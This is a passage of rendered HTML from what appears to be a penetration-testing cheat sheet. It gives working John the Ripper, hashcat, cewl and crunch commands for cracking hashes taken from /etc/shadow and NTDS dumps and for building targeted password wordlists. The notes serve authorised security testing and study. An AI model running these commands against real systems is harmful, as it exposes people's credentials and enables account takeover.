modes\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e source: https://jonathanh.co.uk/blog/fuzzy-search-hashcat-modes.html\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e NOTE: fzf and hashcat required to be installed\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003efunction\u003c/span\u003e \u003cspan class=\"pl-en\"\u003ehcmode\u003c/span\u003e {\n    hashcat --example-hashes \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep -E \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eMODE:|TYPE:|HASH:|Hash mode #|Name\\.*:|Example\\.Hash\\.*:|^$\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e awk -v RS=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\\n\\n\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e -F \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\\t\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e{gsub(\"\\n\",\"\\t\",$0); print $1 \"\\t\" $2 \"\\t\" $3}\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e sed \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003es/MODE: //; s/Hash mode #//; s/TYPE: //; s/ *Name\\.*: //; s/Example\\.Hash\\.*://; s/HASH: //\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e fzf -d \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\\t\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e --header=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eMode   Type\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e --preview=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eecho HASH: {3}\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e --preview-window=up:1 --reverse --height=40% \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e awk \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e{print $1}\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n}\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.2.2 Cracking with John The Ripper\u003c/h3\u003e\u003ca id=\"user-content-322-cracking-with-john-the-ripper\" class=\"anchor\" aria-label=\"Permalink: 3.2.2 Cracking with John The Ripper\" href=\"#322-cracking-with-john-the-ripper\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eUse john for the common cases of cracking.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# afer collecting /etc/passwd and /etc/shadow\nunshadow passwd shadow \u0026gt; unshadowed\n\n# crack unshadow\n# the \u0026quot;=\u0026quot; is required for wordlist\njohn --wordlist=/mnt/vm-share/rockyou.txt unshadowed\n\n# crack hashes by feeding back in the potfile to a different hash mode\njohn --loopback --format=nt ntlm.hashes\n\n# find the desired format, if john doesn't detect it automatically:\njohn --list=formats\n\n# feed custom wordlist via stdin\ncrunch 7 7 -t @@@@@@@ | john --stdin hashes\n# can also use \u0026quot;--pipe\u0026quot; to bulk read and allow rules\n\n# resume last cracking session that was stopped mid-way\njohn --restore\n\n# show cracked hashes from potfile matching those in hashfile\njohn --show --format=nt hashfile\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e afer collecting /etc/passwd and /etc/shadow\u003c/span\u003e\nunshadow passwd shadow \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e unshadowed\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e crack unshadow\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e the \"=\" is required for wordlist\u003c/span\u003e\njohn --wordlist=/mnt/vm-share/rockyou.txt unshadowed\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e crack hashes by feeding back in the potfile to a different hash mode\u003c/span\u003e\njohn --loopback --format=nt ntlm.hashes\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e find the desired format, if john doesn't detect it automatically:\u003c/span\u003e\njohn --list=formats\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e feed custom wordlist via stdin\u003c/span\u003e\ncrunch 7 7 -t @@@@@@@ \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e john --stdin hashes\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e can also use \"--pipe\" to bulk read and allow rules\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e resume last cracking session that was stopped mid-way\u003c/span\u003e\njohn --restore\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e show cracked hashes from potfile matching those in hashfile\u003c/span\u003e\njohn --show --format=nt hashfile\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eYou can add hashcat-style rules to John-the-Ripper's configuration!\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eAdd a new \u003ccode\u003e[List.Rules:MyRules]\u003c/code\u003e label to \u003ccode\u003e/etc/john/john.conf\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eUnder the new label, add you hashcat rules\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# text to be appended to john.conf\ncat my.rule\n[List.Rules:MyRules]\nc $1 $3 $7 $!\nc $1 $3 $7 $@\nc $1 $3 $7 $#\n\n# appending rules with label to john.conf\nsudo sh -c 'cat /home/kali/passwordattacks/my.rule \u0026gt;\u0026gt; /usr/share/john/john-local.conf'\n# config files, loaded in order:\n# /etc/john/john.conf\n# /usr/share/john/john.conf\n# /usr/share/john/john-local.conf\n\n# specifying custom ruleset to use\njohn --wordlist=passwords.txt --rules=MyRules ssh.hash\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e text to be appended to john.conf\u003c/span\u003e\ncat my.rule\n[List.Rules:MyRules]\nc \u003cspan class=\"pl-smi\"\u003e$1\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$3\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$7\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$!\u003c/span\u003e\nc \u003cspan class=\"pl-smi\"\u003e$1\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$3\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$7\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$@\u003c/span\u003e\nc \u003cspan class=\"pl-smi\"\u003e$1\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$3\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$7\u003c/span\u003e \u003cspan class=\"pl-smi\"\u003e$#\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e appending rules with label to john.conf\u003c/span\u003e\nsudo sh -c \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ecat /home/kali/passwordattacks/my.rule \u0026gt;\u0026gt; /usr/share/john/john-local.conf\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e config files, loaded in order:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e /etc/john/john.conf\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e /usr/share/john/john.conf\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e /usr/share/john/john-local.conf\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e specifying custom ruleset to use\u003c/span\u003e\njohn --wordlist=passwords.txt --rules=MyRules ssh.hash\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNOTE\u003c/strong\u003e: John doesn't like spaces between long-options like \u003ccode\u003e--wordlist\u003c/code\u003e, \u003ccode\u003e--rules\u003c/code\u003e, and \u003ccode\u003e--format\u003c/code\u003e and their argument. \u003cstrong\u003eMake sure you use equals (\u003ccode\u003e=\u003c/code\u003e\u003c/strong\u003e)! Example \u003ccode\u003e--rules=MyRules\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.2.3 Cracking with Hashcat\u003c/h3\u003e\u003ca id=\"user-content-323-cracking-with-hashcat\" class=\"anchor\" aria-label=\"Permalink: 3.2.3 Cracking with Hashcat\" href=\"#323-cracking-with-hashcat\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eWhen to use hashcat:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eYou have a hash type that john doesn't understand\u003c/li\u003e\n\u003cli\u003eYou need MOAR SPEED\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# hashcat doesn't automatically ID hashes like john. You have to specify the\n# hash mode manually with the \u0026quot;-m\u0026quot; flag. Look up hashcat modes at:\n# https://hashcat.net/wiki/doku.php?id=example_hashes\n# or do:\nhashcat --help | grep -i \u0026quot;md5\u0026quot;\nhashcat --example-hashes | grep -FB2 ' $1$'  # \u0026quot;-F\u0026quot;=force raw string lookup\n\n# specify mangling rules with addition of:\n-r /usr/share/hashcat/rules/best64.rule\n# more extensive rule list:\n-r /usr/share/hashcat/rules/d3ad0ne.rule\n# Great one for rockyou.txt:\n-r /usr/share/hashcat/rules/rockyou-30000.rule\n\n# basic crack syntax:\n# hashcat -m MODE [OPTIONS] HASH/FILE WORDLIST [WORDLIST...]\n\n# common options:\n# -a NUM - attack mode (0 = use wordlists, 1 = combo words in list, 3 = brute force)\n# -w NUM - workload (2 = default, 3 = degrades your gui, 4 = max)\n\n# cracking /etc/shadow with sha512crypt hashes (\u0026quot;$6$...\u0026quot;)\nhashcat -m1800 -a0 -w3 shadow /mnt/vm-share/rockyou.txt\n\n# resume last cracking session that was stopped mid-way\nhashcat --restore\n\n# showing cracked hashes, with username, from /etc/shadow's sha512crypt hashes\n# hashcat has a potfile (hashcat.potfile) to store old passwords\nhashcat --show --user --outfile-format=2 shadow\n\n# crack all LANMAN hashes with hashcat\n# '-1' flag creates a custom alphabet to use in mask as '?1', can do -2, -3\n# '--increment/-i' starts at zero-length and increments to full length of mask\n# '--potfile-path' specfies custom potfile\nhashcat -a 3 -m 3000 -1 \u0026quot;?u?d?s\u0026quot; --increment --potfile-path hashcat.potfile customer.ntds \u0026quot;?1?1?1?1?1?1?1\u0026quot;\n\n# create wordlist for all passwords starting with \u0026quot;Summer\u0026quot; and ending in 2-4 digits\n# '--increment-min' specifies min length to start mask bruteforce\nhashcat --stdout -a 3 --increment --increment-min 2 \u0026quot;Summer?d?d?d?d\u0026quot; \u0026gt; wordlist\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e hashcat doesn't automatically ID hashes like john. You have to specify the\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e hash mode manually with the \"-m\" flag. Look up hashcat modes at:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e https://hashcat.net/wiki/doku.php?id=example_hashes\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e or do:\u003c/span\u003e\nhashcat --help \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep -i \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003emd5\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\nhashcat --example-hashes \u003cspan class=\"pl-k\"\u003e|\u003c/span\u003e grep -FB2 \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e $1$\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e  \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e \"-F\"=force raw string lookup\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e specify mangling rules with addition of:\u003c/span\u003e\n-r /usr/share/hashcat/rules/best64.rule\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e more extensive rule list:\u003c/span\u003e\n-r /usr/share/hashcat/rules/d3ad0ne.rule\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Great one for rockyou.txt:\u003c/span\u003e\n-r /usr/share/hashcat/rules/rockyou-30000.rule\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e basic crack syntax:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e hashcat -m MODE [OPTIONS] HASH/FILE WORDLIST [WORDLIST...]\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e common options:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -a NUM - attack mode (0 = use wordlists, 1 = combo words in list, 3 = brute force)\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -w NUM - workload (2 = default, 3 = degrades your gui, 4 = max)\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e cracking /etc/shadow with sha512crypt hashes (\"$6$...\")\u003c/span\u003e\nhashcat -m1800 -a0 -w3 shadow /mnt/vm-share/rockyou.txt\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e resume last cracking session that was stopped mid-way\u003c/span\u003e\nhashcat --restore\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e showing cracked hashes, with username, from /etc/shadow's sha512crypt hashes\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e hashcat has a potfile (hashcat.potfile) to store old passwords\u003c/span\u003e\nhashcat --show --user --outfile-format=2 shadow\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e crack all LANMAN hashes with hashcat\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '-1' flag creates a custom alphabet to use in mask as '?1', can do -2, -3\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '--increment/-i' starts at zero-length and increments to full length of mask\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '--potfile-path' specfies custom potfile\u003c/span\u003e\nhashcat -a 3 -m 3000 -1 \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e?u?d?s\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e --increment --potfile-path hashcat.potfile customer.ntds \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e?1?1?1?1?1?1?1\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e create wordlist for all passwords starting with \"Summer\" and ending in 2-4 digits\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e '--increment-min' specifies min length to start mask bruteforce\u003c/span\u003e\nhashcat --stdout -a 3 --increment --increment-min 2 \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eSummer?d?d?d?d\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e wordlist\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNOTE\u003c/strong\u003e: hashcat doesn't feed usernames into the wordlists automatically like john\ndoes, nor does it automatically reverse the usernames. To do this, you have to\nmanually add the usernames as an additional wordlist file, and add mangling\nrules.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cg-emoji class=\"g-emoji\" alias=\"warning\"\u003e锔\u003c/g-emoji\u003e\u003cstrong\u003eNOTE\u003c/strong\u003e: If you see \u003ccode\u003eToken Length Exception\u003c/code\u003e after a failed attempt to crack hashes with hashcat, this is a known bug where it doesn't support modern encryption ciphers with certain mode numbers. In this case, \u003cem\u003e\u003cstrong\u003etry switching to John to crack\u003c/strong\u003e\u003c/em\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eAttack modes:\u003c/strong\u003e\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ccode\u003e0\u003c/code\u003e - Straight: dictionary/wordlist, tries each word from every wordlist file once\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e1\u003c/code\u003e - Combinator: using 2 wordlist files, each word from first file is prepended to each word in second file; can use same file twice\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e3\u003c/code\u003e - Mask: brute force with characters fitting the supplied mask (in place of wordlist)\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ccode\u003e?l\u003c/code\u003e = lowercase ASCII letters\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e?u\u003c/code\u003e = uppercase ASCII letters\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e?d\u003c/code\u003e = digits 0-9\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e?s\u003c/code\u003e = printable special characters + space\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e?a\u003c/code\u003e = all of \u003ccode\u003e?l\u003c/code\u003e + \u003ccode\u003e?u\u003c/code\u003e + \u003ccode\u003e?d\u003c/code\u003e + \u003ccode\u003e?s\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eExample: 1 uppercase, followed by 2 lowercase, followed by 3 digits: \u003ccode\u003e?u?l?l?d?d?d\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e6\u003c/code\u003e - Hybrid Wordlist + Mask: append mask to each word in wordlist\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e7\u003c/code\u003e - Hybrid Mask + Wordlist: prepend mask to each word in wordlist\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e3.2.4 Making Custom Wordlists\u003c/h3\u003e\u003ca id=\"user-content-324-making-custom-wordlists\" class=\"anchor\" aria-label=\"Permalink: 3.2.4 Making Custom Wordlists\" href=\"#324-making-custom-wordlists\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003e\u003ccode\u003ecewl\u003c/code\u003e\u003c/strong\u003e for scraping words from websites:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# cewl spiders a site starting at URL to scrape words\n# -e : include emails\n# --email_file FILE : save emails in separate file\n# -w FILE : write words to file\n# --lowercase : convert all words to lowercase\n# --with-numbers : include words with numbers\n# -d NUM : max depth to spider (0 = only that page)\n# -m NUM : minimum word length\ncewl -e --email_file emails.txt -w cewl.txt --lowercase --with-numbers -d 1 -m 5 URL\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e cewl spiders a site starting at URL to scrape words\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -e : include emails\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e --email_file FILE : save emails in separate file\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -w FILE : write words to file\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e --lowercase : convert all words to lowercase\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e --with-numbers : include words with numbers\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -d NUM : max depth to spider (0 = only that page)\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -m NUM : minimum word length\u003c/span\u003e\ncewl -e --email_file emails.txt -w cewl.txt --lowercase --with-numbers -d 1 -m 5 URL\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003e\u003ccode\u003ecrunch\u003c/code\u003e\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# predefined charsets found in:\ncat /usr/share/crunch/charset.lst\n\n# Syntax:\n# crunch \u0026lt;min-len\u0026gt; \u0026lt;max-len\u0026gt; [ charset1 [ charset2 [ charset3 [ charset4 ]]]] [options]\n\n# Cmdline Flags:\n# -t PATT : use pattern, replacing placeholders ( @ , % ^ ) (see next)\n# -l PATT : literal mask - which placeholder chars in '-t' should be literal.\n#           Must match length of PATT used in '-t'.\n#           E.g. -t p@ssword%! -l p@sswordx! : makes @ a literal, % still placeholder\n# -o FILE : write output to file\n# -f : Specifies a character set from the charset.lst file\n# -s WORD : start at word\n# -e WORD : end at word\n# -p CHARSET / WORD WORD... : permute from charset/words (no repeats), MUST BE LAST OPTION\n# -q FILE : like '-p', but takes chars/words from file\n\n# Charset Placeholders for '-t':\n#   @ : 1st, or lowercase\n#   , : 2nd, or uppercase\n#   % : 3rd, or digits\n#   ^ : 4th, or symbols\n\n# Tip: if you don't want to count the characters in '-t' pattern, \n# just put 1 for min and max lenght. It will tell you how long \n# your pattern is when it errors out\n\n\n##  Examples  =====================================================\n\n# all possible 4 to 6 digit numeric PIN codes\ncrunch 4 6 0123456789\n\n# matching template \u0026quot;Secret###!\u0026quot;\ncrunch 10 10 -t 'Secret%%%!' -o wordlist.txt\n\n# every number between 1950 and 2050 (useful for years)\ncrunch 4 4 -t %%%% -s 1950 -e 2050\n\n# seasonal passwords (e.g. Summer2020!)\ncrunch 6 6 '@!#$' -t s%%%%@ -p Spring Summer Autumn Fall Winter\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e predefined charsets found in:\u003c/span\u003e\ncat /usr/share/crunch/charset.lst\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Syntax:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e crunch \u0026lt;min-len\u0026gt; \u0026lt;max-len\u0026gt; [ charset1 [ charset2 [ charset3 [ charset4 ]]]] [options]\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Cmdline Flags:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -t PATT : use pattern, replacing placeholders ( @ , % ^ ) (see next)\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e -l PATT : literal mask - which placeholder chars in '-t' should be literal.\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e           Must match length of PATT used in '-t'.\u003c/span\u003e\n\u003cspan 